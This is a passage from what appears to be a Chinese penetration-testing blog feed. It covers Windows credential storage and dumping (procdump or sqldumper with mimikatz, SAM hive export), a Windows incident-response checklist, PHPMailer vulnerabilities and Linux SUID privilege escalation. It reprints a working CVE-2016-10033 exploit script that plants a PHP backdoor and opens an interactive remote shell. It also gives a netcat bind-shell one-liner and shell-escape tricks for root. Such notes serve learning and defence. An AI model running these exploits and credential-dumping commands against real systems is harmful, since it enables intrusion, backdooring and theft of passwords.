alt></li><li></li><li><strong>使用procdump.exe与mimikatz.exe</strong></li><li>procdump.exe -accepteula -ma lsass.exe lsass.dmp</li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/12.png" alt></li><li>mimikatz.exe</li><li>sekurlsa::minidump lsass.dmp</li><li>sekurlsa::logonpasswords full</li><li>一行命令：mimikatz.exe “sekurlsa::minidump lsass.dmp” “sekurlsa::logonpasswords full”</li><li><img src="/Windows%E4%B9%8B%E5%87%AD%E8%AF%81/13.png" alt></li><li></li><li><strong>同理使用sqldumper.exe与mimikatz.exe</strong></li><li>服务器没有安装sql server就上传一个sqldumper.exe</li><li>tasklist /svc | findstr lsass.exe</li><li>sqldumper.exe PID 0 0x01100</li><li>mimikatz.exe</li><li>sekurlsa::minidump sqldmpr0001.dmp</li><li>sekurlsa::logonpasswords</li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><p><a href="https://www.freebuf.com/company-information/196752.html" target="_blank" rel="noopener">https://www.freebuf.com/company-information/196752.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 内网渗透 </tag>
            
            <tag> windows </tag>
            
            <tag> mimikatz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows之认证与利用</title>
      <link href="/Windows%E4%B9%8B%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>/Windows%E4%B9%8B%E8%AE%A4%E8%AF%81%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-windows认证过程"><a href="#0x00-windows认证过程" class="headerlink" title="0x00 windows认证过程"></a>0x00 windows认证过程</h2><ol><li>开机、注销、重启、锁屏、睡眠、休眠后，使用操作系统会显示登录窗口即执行winlogon.exe</li><li>用户输入密码</li><li>将密码交给lsass.exe</li><li>lsass.exe将密码加密成NTLM Hash后跟SAM数据库比较认证。</li></ol><h2 id="0x01-lsass-exe"><a href="#0x01-lsass-exe" class="headerlink" title="0x01 lsass.exe"></a>0x01 lsass.exe</h2><ol><li>lsass.exe是一个系统进程，用于微软Windows系统的安全机制，用于本地安全和登陆策略。</li><li>WDigest 协议的存在在一些旧版本的 windows 操作系统中XP – win 8.0 和 server 2003 – server 2012 R1纯文本密码存储在 lsass.exe 进程中。</li><li>对于旧版本操作系统微软官方发布 KB2871997 补丁允许用户自行决定是否禁用该协议。</li><li>修改是否禁用需要修改注册表HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest将Negotiate 和 UseLogonCredential 注册表项值应设置为 0 可以完全禁用此协议。</li></ol><h2 id="0x02-SAM文件"><a href="#0x02-SAM文件" class="headerlink" title="0x02 SAM文件"></a>0x02 SAM文件</h2><ol><li>SAM（Security Accounts Manager：安全账户管理），是windows 操作系统管理用户帐户的安全所使用的一种机制。</li><li>安全帐户管理器对帐号的管理是通过安全标识进行的安全标识。</li><li>安全标识是唯一的即使是相同的用户名在每次创建时获得的安全标识都时完全不同的，一旦帐号被删除安全标识也同时被删除。</li><li>SAM 是用来存储 windows 操作系统密码的数据库文件为了避免明文密码泄漏SAM 文件中保存的是明文密码在经过一系列算法处理过的 Hash 值被保存的 Hash 分为 LM Hash 、 NTLM Hash 。</li><li>SAM 文件保存于%SystemRoot%\system32\config\sam中</li><li>在注册表中，SAM 保存在</li><li>HKEY_LOCAL_MACHINE\SAM\SAM</li><li>HKEY_LOCAL_MACHINE\SECURITY\SAM</li><li>SAM 文件中被 bootkey（SysKey） 加密，而 bootkey 则保存在这个SYSTEM 文件下。</li><li>SAM 中 hash 密码存储格式为用户名称:RID:LM-HASH值:NT-HASH值</li></ol><h2 id="0x03-Hash-LM-Hash和-NT-Hash（NTLM-Hash）"><a href="#0x03-Hash-LM-Hash和-NT-Hash（NTLM-Hash）" class="headerlink" title="0x03 Hash LM Hash和 NT Hash（NTLM Hash）"></a>0x03 Hash LM Hash和 NT Hash（NTLM Hash）</h2><ol><li>windows 操作系统中存在两套加密方式加密生成密码 Hash LM Hash 和 NT Hash(NTLM Hash)。</li><li>目前主要使用的加密方式为 NTLM Hash其中 NTLM 全称是“NT LAN Manager”。而 NTLM 也是一种网络认证协议与 NTLM Hash 的关系就是NTLM 网络认证协议是以 NTLM Hash 作为根本凭证进行认证的协议。</li><li><strong>LM Hash</strong></li><li>LM Hash 全称是 LAN Manager Hash是windows最早用的加密算法由IBM设计。</li><li>由于 LM Hash 使用 DES 加密密钥为硬编码算法又存在缺陷所以被废弃但为保证系统兼容性 LM hash 并未被删除可以自行选择是否开启使用。</li><li>生成规则：</li><li>用户的密码最长14位：password</li><li>用户的密码转换为大写：PASSWORD</li><li>再大写密码转换成十六进制串：50415353574f5244</li><li>密码不足14位，添加0x00补足到14字节：50415353574f5244000000000000</li><li>固定长度的密码被分成两个 7byte 部分分别经 str_to_key() 函数处理得到两组8字节数据</li><li>50415353574f52——转换为比特流——01010000010000010101001101010011010100010100111101010010——分成7组，每组后加一个0</li><li>01010000-00100000-01010100-01101010-00110100-10001010-00111100-10100100——二进制转16进制——50205469348A3CA4</li><li>44000000000000——同理略</li><li>这两组8字节数据将做为 DESKEY 对魔术字符串“KGS!@#$%”进行标准DES加密</li><li>KGS!@#$%——4B47532140232425</li><li>50205469348A3CA4对4B47532140232425进行标准DES加密——2FE8FE654020D523</li><li>将加密后的这两组数据简单拼接就得到了最后的 LM Hash——2FE8FE654020D523略</li><li><strong>NT Hash</strong></li><li>与LM Hash算法不同NT Hash 不需要添加0×00补足14字节。</li><li>将输入的明文信息转换为十六进制经过Unicode转换后再调用MD4加密算法加密这个加密结果的十六进制就是 NT Hash。</li><li>admin——hex(16进制编码) 61646d696e——Unicode：610064006d0069006e00——标准MD4加密：209c6174da490caeb422f3fa5a7ae634</li></ol><h2 id="0x04-Mscache-Hash"><a href="#0x04-Mscache-Hash" class="headerlink" title="0x04 Mscache Hash"></a>0x04 Mscache Hash</h2><ol><li>mscache hash是域用户在登录域内机器时，所留下的域缓存凭据的密码加密方式，又称 dcc hash，根据操作系统的版本不同，分为 dcc1 hash 与 dcc2 hash。Vista 之前保存的是 dcc1， 之后保存的是 dcc2。</li><li>生成规则：</li><li>DCC1 = MD4 (NT HASH + LowerUnicode(username))</li><li>DCC2 = PBKDF2(HMAC-SHA1, Iterations, DCC1, LowerUnicode(username))</li><li>解密步骤：</li><li>得到 bootkey</li><li>利用 bootkey 解密 LSA Key</li><li>利用 LSA Key 解密 NLKM Key</li><li>利用 NLKM Key 解密 MSCACHE</li><li>![](/Windows之认证与利用 /1.png)</li><li>其中 bootkey 被拆成了 4 部分，分别保存在：</li><li>HKLM\System\CurrentControlSet\Control\Lsa\JD</li><li>HKLM\System\CurrentControlSet\Control\Lsa\Skew1</li><li>HKLM\System\CurrentControlSet\Control\Lsa\Data</li><li>HKLM\System\CurrentControlSet\Control\Lsa\GBG</li></ol><h2 id="0x05-访问令牌"><a href="#0x05-访问令牌" class="headerlink" title="0x05 访问令牌"></a>0x05 访问令牌</h2><ol><li>Windows Token 其实叫 Access Token访问令牌它是一个描述进程或者线程安全的一个对象。</li><li>令牌组成：</li><li>用户帐户的安全标识符(SID)</li><li>用户所属的组的SID</li><li>用于标识当前登录会话的登录SID</li><li>用户或用户组所拥有的权限列表</li><li>所有者SID</li><li>主要组的SID</li><li>访问控制列表</li><li>访问令牌的来源</li><li>令牌是主要令牌还是模拟令牌</li><li>限制SID的可选列表</li><li>目前的模拟等级</li><li>其他统计数据</li><li>查询SID列表：wmic useraccount  get name,sid</li></ol><h2 id="0x06-获取用户凭证"><a href="#0x06-获取用户凭证" class="headerlink" title="0x06 获取用户凭证"></a>0x06 获取用户凭证</h2><ol><li><p><strong>本地用户凭证</strong></p></li><li><p>通过SAM文件破解，管理员运行cmd：</p></li><li><p>reg save hklm\sam c:\sam.hive</p></li><li><p>reg save hklm\system c:\system.hive</p></li><li><p><strong>获取lsass内存</strong></p></li><li><p>procdump，管理员运行cmd：</p></li><li><p>procdump64.exe -accepteula -ma lsass.exe 路径\文件名</p></li><li><p>mimikatz破解</p></li><li><p>mimikatz # sekurlsa::minidump 文件名</p></li><li><p>mimikatz # sekurlsa::logonPasswords full</p></li><li><p>除了procdump工具，还可以通过任务管理器——详细信息——lsass.exe——右击——创建转储文件</p></li><li><p><strong>域用户凭证</strong></p></li><li><p>ntdsutil </p></li><li><p>DiskShadow</p></li><li><p>vssadmin</p></li><li><p>Mimikatz</p></li><li><p>secretsdump</p></li><li><p><strong>ntds文件解密</strong></p></li><li><p>Impacket-secretsdump</p></li><li><p>Quarks PwDump</p></li><li><p>NtdsAudit</p></li></ol><h2 id="0xFF-Referers"><a href="#0xFF-Referers" class="headerlink" title="0xFF Referers"></a>0xFF Referers</h2><p><a href="https://www.freebuf.com/articles/system/224171.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/224171.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows安全</title>
      <link href="/Windows%E5%AE%89%E5%85%A8/"/>
      <url>/Windows%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><ol><li>测试环境：windows server 2008 R2</li></ol><h2 id="0x10-应急响应之账号"><a href="#0x10-应急响应之账号" class="headerlink" title="0x10 应急响应之账号"></a>0x10 应急响应之账号</h2><h3 id="0x11-检查登录用户与弱口令"><a href="#0x11-检查登录用户与弱口令" class="headerlink" title="0x11 检查登录用户与弱口令"></a>0x11 检查登录用户与弱口令</h3><ol><li>咨询主机或服务器的管理员，所有用户是否属于常见账户（Administrator、admin等等）或是否存在某种规律（user1、user2等等），所有用户密码是否存在弱口令（123456、qwerty等等）。</li></ol><h3 id="0x12-检查可疑用户"><a href="#0x12-检查可疑用户" class="headerlink" title="0x12 检查可疑用户"></a>0x12 检查可疑用户</h3><ol><li>运行Lusrmgr.msc——组——Administrator——查看Administrator组下是否存在其他用户</li></ol><h3 id="0x13-检查隐藏用户"><a href="#0x13-检查隐藏用户" class="headerlink" title="0x13 检查隐藏用户"></a>0x13 检查隐藏用户</h3><ol><li>运行regedit</li><li>计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names</li><li>或者：</li><li>运行——compmgmt.msc——计算机管理——系统工具——本地用户和组——用户</li></ol><h3 id="0x14-日志分析用户异常登陆"><a href="#0x14-日志分析用户异常登陆" class="headerlink" title="0x14 日志分析用户异常登陆"></a>0x14 日志分析用户异常登陆</h3><ol><li>运行eventvwr.msc——windows日志——右键安全——筛选当前日志——输入事件ID（登录是：4624）——可直观查看</li><li>或者运行eventvwr.msc——windows日志——右键安全——将所有事件另存为——保存后——命令行查询</li><li>可视化查看所有事件：</li><li>Logparser.exe –i:EVT –o:DATAGRID “SELECT * FROM C:\\login.evtx”</li><li>可视化查看登录失败日志：</li><li>Logparser.exe –i:EVT –o:DATAGRID “SELECT * FROM C:\\login.evtx where EventID=4625”</li><li>可视化查看登录失败的登录时间，登录用户，登录IP信息</li><li>LogParser.exe -i:EVT –o:DATAGRID “SELECT TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,’|’) as username,EXTRACT_TOKEN(Strings,19,’|’) AS SIP FROM C:\\login.evtx where EventID=4625”</li><li><img src="/Windows%E5%AE%89%E5%85%A8/1.png" alt="事件ID"></li><li></li><li><a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659" target="_blank" rel="noopener">Log Parser</a></li><li>可以通过可视化工具<strong>Log Parser Lizard</strong>，搜索查询登录情况</li></ol><h3 id="0x15-安全工具扫描"><a href="#0x15-安全工具扫描" class="headerlink" title="0x15 安全工具扫描"></a>0x15 安全工具扫描</h3><ol><li><a href="http://www.d99net.net/" target="_blank" rel="noopener">D盾</a>查杀</li><li><img src="/Windows%E5%AE%89%E5%85%A8/2.png" alt></li></ol><h2 id="0x20-应急响应之网络与进程"><a href="#0x20-应急响应之网络与进程" class="headerlink" title="0x20 应急响应之网络与进程"></a>0x20 应急响应之网络与进程</h2><h3 id="0x21-检查网络拓扑与流量行为"><a href="#0x21-检查网络拓扑与流量行为" class="headerlink" title="0x21 检查网络拓扑与流量行为"></a>0x21 检查网络拓扑与流量行为</h3><ol><li>咨询管理员，主机或服务器是否对公网开放。</li></ol><h3 id="0x22-检查网络端口连接情况"><a href="#0x22-检查网络端口连接情况" class="headerlink" title="0x22 检查网络端口连接情况"></a>0x22 检查网络端口连接情况</h3><ol><li>netstat -ano </li><li><img src="/Windows%E5%AE%89%E5%85%A8/3.png" alt></li><li>关注状态为：ESTABLISHED</li><li>netstat -ano | findstr “ESTABLISHED”</li><li>也可以查看相关端口的，如端口为3389</li><li>netstat -ano | findstr “3389”</li><li></li><li>netstat查出PID后，使用tasklist定位进程，如PID为12345</li><li>tasklist | findstr “12345”</li><li><img src="/Windows%E5%AE%89%E5%85%A8/4.png" alt></li><li></li><li>再运行msinfo32——软件环境——正在运行任务——查看相关进程的信息（路径、开始时间等等）</li></ol><h3 id="0x23-可疑进程"><a href="#0x23-可疑进程" class="headerlink" title="0x23 可疑进程"></a>0x23 可疑进程</h3><ol><li>占用CPU过高的进程</li><li>没有描述信息的进程</li><li><img src="/Windows%E5%AE%89%E5%85%A8/8.png" alt></li><li><img src="/Windows%E5%AE%89%E5%85%A8/7.png" alt></li><li>没有签名验证信息的进程</li><li>进程路径是否可疑</li><li>进程的属主</li></ol><h3 id="0x24-安全工具扫描"><a href="#0x24-安全工具扫描" class="headerlink" title="0x24 安全工具扫描"></a>0x24 安全工具扫描</h3><ol><li><a href="http://www.d99net.net/" target="_blank" rel="noopener">D盾</a>查杀</li><li><img src="/Windows%E5%AE%89%E5%85%A8/5.png" alt></li><li></li><li>微软的<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer" target="_blank" rel="noopener">Process Explorer</a>来排查</li><li><img src="/Windows%E5%AE%89%E5%85%A8/6.png" alt></li></ol><h3 id="结束进程"><a href="#结束进程" class="headerlink" title="结束进程"></a>结束进程</h3><ol><li>taskkill /f /pid PID</li><li><img src="/Windows%E5%AE%89%E5%85%A8/9.png" alt></li><li>tskill PID</li><li><img src="/Windows%E5%AE%89%E5%85%A8/10.png" alt></li></ol><h2 id="0x30-应急响应之启动、计划任务、服务"><a href="#0x30-应急响应之启动、计划任务、服务" class="headerlink" title="0x30 应急响应之启动、计划任务、服务"></a>0x30 应急响应之启动、计划任务、服务</h2><h3 id="0x31-开机启动"><a href="#0x31-开机启动" class="headerlink" title="0x31 开机启动"></a>0x31 开机启动</h3><ol><li>开始——所有程序——启动，一般为空，检查是否存在程序在此目录</li><li>或者 运行msconfig——启动——检查是否存在非法开机启动程序</li><li>或者 任务管理器——启动——检查是否存在非法开机启动程序</li><li>或者 查看注册表开机启动项：</li><li>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</li><li>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</li><li>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</li><li>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</li><li>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder</li><li>运行gpedit.msc——windows设置——脚本（启动/关机）</li></ol><h3 id="0x32-计划任务"><a href="#0x32-计划任务" class="headerlink" title="0x32 计划任务"></a>0x32 计划任务</h3><ol><li>开始——控制面板——管理工具——任务计划程序，查看计划任务属性</li></ol><h3 id="0x33-自启动服务"><a href="#0x33-自启动服务" class="headerlink" title="0x33 自启动服务"></a>0x33 自启动服务</h3><ol><li>运行services.msc——查看可疑服务与正在运行状态的服务</li></ol><h2 id="0x40-应急响应之系统信息、目录文件"><a href="#0x40-应急响应之系统信息、目录文件" class="headerlink" title="0x40 应急响应之系统信息、目录文件"></a>0x40 应急响应之系统信息、目录文件</h2><h3 id="0x41-系统版本与补丁"><a href="#0x41-系统版本与补丁" class="headerlink" title="0x41 系统版本与补丁"></a>0x41 系统版本与补丁</h3><ol><li>运行systeminfo，查看系统信息</li></ol><h3 id="0x42-可疑目录与文件"><a href="#0x42-可疑目录与文件" class="headerlink" title="0x42 可疑目录与文件"></a>0x42 可疑目录与文件</h3><ol><li>新建用户会在C:\Users目录下</li><li>运行%userprofile%\recent，查看用户最近打开的可疑文件</li><li>在各目录查看最近时间被操作的文件</li></ol><h2 id="0x50-应急响应之日志"><a href="#0x50-应急响应之日志" class="headerlink" title="0x50 应急响应之日志"></a>0x50 应急响应之日志</h2><h3 id="0x51-日志分析"><a href="#0x51-日志分析" class="headerlink" title="0x51 日志分析"></a>0x51 日志分析</h3><ol><li>检查主机或服务器是否开启审核策略</li><li>运行eventvwr.msc——事件查看器——windows日志——导出 应用程序/安全/系统 日志，然后分析</li><li>进入网站目录，拷贝web日志，然后分析</li><li>或者 查看日志服务器进行分析。</li></ol><h2 id="0x60-应急响应之安全软件"><a href="#0x60-应急响应之安全软件" class="headerlink" title="0x60 应急响应之安全软件"></a>0x60 应急响应之安全软件</h2><h3 id="0x61-安全软件"><a href="#0x61-安全软件" class="headerlink" title="0x61 安全软件"></a>0x61 安全软件</h3><ol><li>下载安装最新版安全软件，或者离线更新软件版本及病毒库，然后备份再全盘扫描。</li></ol><h3 id="0x62-webshell查杀"><a href="#0x62-webshell查杀" class="headerlink" title="0x62 webshell查杀"></a>0x62 webshell查杀</h3><ol><li>下载webshell查杀工具对web目录进行离线查杀</li><li>或 拷贝可疑文件或者整个目录（<strong>不建议</strong>），上传到在线查杀网站进行查杀</li></ol><h3 id="0x63-一些webshell查杀工具"><a href="#0x63-一些webshell查杀工具" class="headerlink" title="0x63 一些webshell查杀工具"></a>0x63 一些webshell查杀工具</h3><ol><li><a href="http://www.d99net.net/" target="_blank" rel="noopener">D盾防火墙</a></li><li><a href="https://scanner.baidu.com/#/pages/intro" target="_blank" rel="noopener">WEBDIR+</a></li><li><a href="http://www.shelldetector.com/" target="_blank" rel="noopener">Web Shell Detector</a></li><li><a href="http://sec.sangfor.com.cn/download?file=WebShellKillerTool.rar" target="_blank" rel="noopener">WebShellkiller</a></li><li><a href="https://www.shellpub.com/" target="_blank" rel="noopener">SHELLPUB.COM专注查杀</a></li><li><a href="https://github.com/jvoisin/php-malware-finder" target="_blank" rel="noopener">php-malware-finder</a></li></ol><h2 id="0x70-安全加固"><a href="#0x70-安全加固" class="headerlink" title="0x70 安全加固"></a>0x70 安全加固</h2><ol><li>本地组策略编辑器——计算机配置——windows设置——安全设置——本地策略——安全选项——交互式登录：之前登录到缓存的次数——默认10（建议设置为0）</li><li>WDigest协议修改是否禁用需要修改注册表HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDigest将Negotiate 和 UseLogonCredential 注册表项值应设置为 0 可以完全禁用此协议。</li><li>未完</li></ol><h2 id="0xF0-脚本"><a href="#0xF0-脚本" class="headerlink" title="0xF0 脚本"></a>0xF0 脚本</h2><p><strong>windows信息搜集脚本</strong></p><pre><code>@echo offecho #######whoami######&gt;.\info.txtwhoami&gt;&gt;.\info.txtechoecho #######whoami 权限######&gt;.\info.txtwhoami /priv&gt;&gt;.\info.txtechoecho #######system info######&gt;.\info.txtecho systeminfo 系统信息&gt;&gt;.\info.txtsysteminfo&gt;&gt;.\info.txtechoecho #######ver 系统版本#######&gt;&gt;.\info.txtver&gt;&gt;.\info.txtechoecho #######hostname 主机名#######&gt;&gt;.\info.txthostname&gt;&gt;.\info.txtechoecho #######set 环境变量#######&gt;&gt;.\info.txtset&gt;&gt;.\info.txtechoecho #######net start#######&gt;&gt;.\info.txtnet start&gt;&gt;.\info.txtechoecho #######net user 用户#######&gt;&gt;.\info.txtnet user&gt;&gt;.\info.txtechoecho #######net localgroup 用户组#######&gt;&gt;.\info.txtnet localgroup&gt;&gt;.\info.txtechoecho #######net localgroup administrators 管理员信息#######&gt;&gt;.\info.txtnet localgroup administrators&gt;&gt;.\info.txtechoecho #######net user guest 访问用户#######&gt;&gt;.\info.txtnet user guest&gt;&gt;.\info.txtechoecho #######tasklist 进程信息#######&gt;&gt;.\info.txttasklist&gt;&gt;.\info.txtechoecho #######ipconfig /all 网络信息#######&gt;&gt;.\info.txtipconfig /all&gt;&gt;.\info.txtechoecho #######ipconfig /displaydns 本地DNS缓存信息#######&gt;&gt;.\info.txtipconfig /displaydns&gt;&gt;.\info.txtechoecho #######route print 路由表#######&gt;&gt;.\info.txtroute print&gt;&gt;.\info.txtechoecho #######arp -a ip对应的mac地址#######&gt;&gt;.\info.txtarp -a&gt;&gt;.\info.txtechoecho #######netstat -ano 开发端口与连接信息#######&gt;&gt;.\info.txtnetstat -an&gt;&gt;.\info.txtechoecho #######sc query type=service state=all 系统注册的服务信息#######&gt;&gt;.\info.txtsc query type=service state=all&gt;&gt;.\info.txtechoecho #######wmic qfe list 系统补丁信息#######&gt;&gt;.\info.txtwmic qfe list&gt;&gt;.\info.txtechoecho #######schtasks 计划任务#######&gt;&gt;.\info.txtschtasks&gt;&gt;.\info.txtechoecho #######netsh firewall show config#######&gt;&gt;.\info.txtnetsh firewall show config&gt;&gt;.\info.txtechoecho #######列出安装的驱动##############&gt;&gt;.\info.txtdriverquery&gt;&gt;.\info.txtechoecho #######列出系统树目录#######&gt;&gt;.\info.txtcd \tree&gt;&gt;.\info.txt</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPMailer漏洞</title>
      <link href="/PHPMailer%E6%BC%8F%E6%B4%9E/"/>
      <url>/PHPMailer%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-PHPMailer"><a href="#0x00-PHPMailer" class="headerlink" title="0x00 PHPMailer"></a>0x00 PHPMailer</h2><h2 id="任意文件读取漏洞（CVE-2017-5223）"><a href="#任意文件读取漏洞（CVE-2017-5223）" class="headerlink" title="任意文件读取漏洞（CVE-2017-5223）"></a>任意文件读取漏洞（CVE-2017-5223）</h2><ol><li>PHPMailer在发送邮件的过程中，会在邮件内容中寻找图片标签（&lt;img src=”…”&gt;），并将其src属性的值提取出来作为附件。</li><li>可以利用&lt;img src=”/etc/passwd”&gt;将文件/etc/passwd作为附件读取出来，造成任意文件读取漏洞。</li></ol><h2 id="远程命令执行（CVE-2016-10033）"><a href="#远程命令执行（CVE-2016-10033）" class="headerlink" title="远程命令执行（CVE-2016-10033）"></a>远程命令执行（CVE-2016-10033）</h2><ol><li>docker search cve-2016-10033</li><li>docker pull vulnerables/cve-2016-10033</li><li><img src="/PHPMailer%E6%BC%8F%E6%B4%9E/2.png" alt></li><li>浏览器访问：<a href="http://IP:8080/" target="_blank" rel="noopener">http://IP:8080/</a></li><li><img src="/PHPMailer%E6%BC%8F%E6%B4%9E/1.png" alt></li><li><img src="/PHPMailer%E6%BC%8F%E6%B4%9E/3.png" alt></li></ol><p><strong>EXP:phpmailer.sh</strong></p><pre><code>#!/bin/bash# CVE-2016-10033 exploit by opsxcq# https://github.com/opsxcq/exploit-CVE-2016-10033echo &#39;[+] CVE-2016-10033 exploit by opsxcq&#39;if [ -z &quot;$1&quot; ]then    echo &#39;[-] Please inform an host as parameter&#39;    exit -1fiif [ $(uname) == &#39;Darwin&#39; ]then    decoder=&#39;base64 -D&#39;elif [ $(uname) == &#39;Linux&#39; ]then    decoder=&#39;base64 -d&#39;  else    echo &#39;[-] Your platform isnt supported: &#39;$(uname)    exit -1fihost=$1echo &#39;[+] Exploiting &#39;$hostcurl -sq &#39;http://&#39;$host -H &#39;Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe&#39; --data-binary $&#39;------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;action&quot;\r\n\r\nsubmit\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;name&quot;\r\n\r\n&lt;?php echo &quot;|&quot;.base64_encode(system(base64_decode($_GET[&quot;cmd&quot;]))).&quot;|&quot;; ?&gt;\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;email&quot;\r\n\r\n\&quot;vulnerables\\\&quot; -OQueueDirectory=/tmp -X/www/backdoor.php server\&quot; @test.com\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\r\nContent-Disposition: form-data; name=&quot;message&quot;\r\n\r\nPwned\r\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\r\n&#39; &gt;/dev/null &amp;&amp; echo &#39;[+] Target exploited, acessing shell at http://&#39;$host&#39;/backdoor.php&#39;echo &#39;[+] Checking if the backdoor was created on target system&#39;code=$(curl -o /dev/null --silent --head --write-out &#39;%{http_code}\n&#39; &quot;http://$host/backdoor.php&quot;)if [ &quot;$code&quot; != &quot;200&quot; ]then    echo &#39;[-] Target cant be exploited&#39;    exit -1else    echo &#39;[+] Backdoor.php found on remote system&#39;ficmd=&#39;whoami&#39;while [ &quot;$cmd&quot; != &#39;exit&#39; ]do    echo &#39;[+] Running &#39;$cmd    if ! curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) | grep &#39;|&#39; | grep -v &#39;base64_encode&#39; | head -n 1 | cut -d &#39;|&#39; -f 2 | $decoder     then        echo &#39;[-] Connection problens&#39;        exit -1    fi    echo    read -p &#39;RemoteShell&gt; &#39; cmddoneecho &#39;[+] Exiting&#39;</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://github.com/opsxcq/exploit-CVE-2016-10033" target="_blank" rel="noopener">https://github.com/opsxcq/exploit-CVE-2016-10033</a></li><li><a href="https://vulhub.org/#/environments/phpmailer/CVE-2017-5223/" target="_blank" rel="noopener">https://vulhub.org/#/environments/phpmailer/CVE-2017-5223/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权之linux-suid</title>
      <link href="/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/"/>
      <url>/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-suid提权"><a href="#0x00-suid提权" class="headerlink" title="0x00 suid提权"></a>0x00 suid提权</h2><ol><li>suid：set user id ，suid是Linux的一种权限机制，具有该权限的文件在被执行时，使用者会暂时获取文件拥有者的权限。</li><li>sgid：set group id</li><li>ls -l #查看文件权限</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/1.png" alt></li><li>0 1 2 3 4 5 6 7 8 9</li><li><ul><li>r w s r - x r - x</li></ul></li><li>0：代表文件类型：</li><li><ul><li>p：命名管道文件</li></ul></li><li><ul><li>d：目录文件</li></ul></li><li><ul><li>l：符合连接文件</li></ul></li><li><ul><li>-：普通文件</li></ul></li><li><ul><li>s：socket文件</li></ul></li><li><ul><li>c：字符设备文件</li></ul></li><li><ul><li>b：块设备文件</li></ul></li><li>1-3：文件所有者的权限，4-6:组用户的权限，7-9：用户的权限</li><li>r：可读，w：可写，x：可执行，-：无权限</li></ol><p><strong>查找所有suid可执行文件</strong></p><pre><code>find / -user root -perm -4000 -print 2&gt;/dev/nullfind /  -perm -u=s -type f 2&gt;/dev/nullfind / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null</code></pre><p><strong>具有suid的命令</strong></p><ul><li>sudo</li><li>passwd</li><li>mount</li><li>ping</li><li>su</li><li>…</li></ul><p><strong>nmap 旧版本2.02-5.2.1有交互模式</strong></p><pre><code>nmap --interactive!shidmetasploit模块：exploit/unix/local/setuid_nmap </code></pre><p><strong>find</strong></p><ol><li>自主赋权</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/2.png" alt></li><li>find test123 -exec whoami ;</li><li><img src="/%E6%8F%90%E6%9D%83%E4%B9%8Blinux-suid/3.png" alt></li><li>反弹shell：find test123 -exec netcat -lvp 6666 -e /bin/bash ;</li></ol><p><strong>vim.tiny</strong></p><ol><li>自主赋权（图略）</li><li>cat /etc/shadow #无权限</li><li>vim.tiny /etc/shadow #可读</li><li>vim.tiny</li><li>:set shell=/bin/bash</li><li>:shell</li></ol><p><strong>bash</strong></p><ol><li>自主赋权（图略）</li><li>bash -p</li><li>id</li></ol><p><strong>less/more</strong></p><ol><li>less /etc/passwd</li><li>!/bin/sh</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP之配置漏洞</title>
      <link href="/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/"/>
      <url>/PHP%E4%B9%8B%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/</url>
      
